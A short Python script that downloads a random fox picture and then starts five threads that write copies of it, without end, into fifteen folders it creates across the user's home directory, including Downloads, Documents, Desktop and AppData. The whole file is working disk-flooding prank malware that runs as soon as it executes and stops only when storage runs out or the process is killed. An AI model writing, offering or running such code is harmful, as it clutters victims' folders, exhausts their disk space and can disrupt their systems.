from pathlib import Path
import requests
import time
from itertools import cycle
import threading

class Abomination:
    def __init__(self):
        self.img = None
        self.paths = self.path1 = self.path2 = self.path3 = self.path4 = self.path5 = None
    def request(self):
        url = "https://randomfox.ca/floof/"
        img_data = requests.get(url).json()['image']
        print(img_data)
        self.img = requests.get(img_data).content
    def path(self):
        self.paths = [Path.home() / "Downloads" ,
                      Path.home() ,
                      Path.home() / "Documents" ,
                      Path.home() / "Pictures" ,
                      Path.home() / "Desktop" ,
                      Path.home() / "Music" ,
                      Path.home() / "Videos" ,
                      Path.home() / "Games" ,
                      Path.home() / "Screenshots" ,
                      Path.home() / "Saved Games" ,
                      Path.home() / "AppData" / "Roaming" ,
                      Path.home() / "AppData" ,
                      Path.home() / "Favorites" ,
                      Path.home() / "AppData" / "Local" ,
                      Path.home() / "Goon"
                      ]
        for i in self.paths:
            i.mkdir(parents=True , exist_ok=True)
        self.path1 = cycle(self.paths[:3])
        self.path2 = cycle(self.paths[3:6])
        self.path3 = cycle(self.paths[6:9])
        self.path4 = cycle(self.paths[9:12])
        self.path5 = cycle(self.paths[12:15])
    def save1(self):
        while True:
            with open(next(self.path1) / f"{time.time_ns()}.jpg", "wb") as jpg:
                jpg.write(self.img)
    def save2(self):
        while True:
            with open(next(self.path2) / f"{time.time_ns()}.jpg", "wb") as jpg:
                jpg.write(self.img)
    def save3(self):
        while True:
            with open(next(self.path3) / f"{time.time_ns()}.jpg", "wb") as jpg:
                jpg.write(self.img)
    def save4(self):
        while True:
            with open(next(self.path4) / f"{time.time_ns()}.jpg", "wb") as jpg:
                jpg.write(self.img)
    def save5(self):
        while True:
            with open(next(self.path5) / f"{time.time_ns()}.jpg", "wb") as jpg:
                jpg.write(self.img)
    def run(self):
        self.path()
        self.request()
        t1 = threading.Thread(target=self.save1)
        t2 = threading.Thread(target=self.save2)
        t3 = threading.Thread(target=self.save3)
        t4 = threading.Thread(target=self.save4)
        t5 = threading.Thread(target=self.save5)
        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()
Abomination().run()
